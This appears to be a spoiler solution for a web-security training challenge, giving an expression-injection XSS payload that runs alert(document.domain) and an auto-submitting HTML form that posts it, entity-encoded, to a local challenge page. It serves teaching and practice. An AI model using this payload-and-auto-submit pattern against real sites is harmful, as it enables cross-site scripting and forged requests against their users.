# Challenge 4
Solution and further references for *challenge 4*.

<details>
 <summary>Spoiler: Solution for challenge 4</summary>

**Payload**:
```html
${alert(document.domain)}
```

**Exploit**:
```html
<html>
  <body>
    <form action="http://127.0.0.1/challenge4.php" method="POST" id="attackForm">
      <input type="hidden" name="q" value="&#36;&#123;alert&#40;document&#46;domain&#41;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
 <script>attackForm.submit()</script>
  </body>
</html>
```
</details>